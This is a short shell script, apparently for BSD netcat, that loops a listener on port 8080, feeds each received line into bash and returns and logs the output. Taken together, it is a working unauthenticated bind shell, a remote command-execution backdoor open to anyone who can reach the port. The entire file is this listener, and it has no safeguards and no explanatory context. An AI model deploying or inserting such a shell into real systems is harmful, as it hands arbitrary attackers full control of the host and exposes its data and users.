#!/bin/sh
# Designed for Eric Jackson's BSD netcat

date >> log
killall tail
tail -f log &

while [ true ]
do
    echo "\nNow listening..."
    : | { nc -l 8080 -w 60 | tee -a log | bash | tee -a log; } > /dev/fd/0 2>&1
done


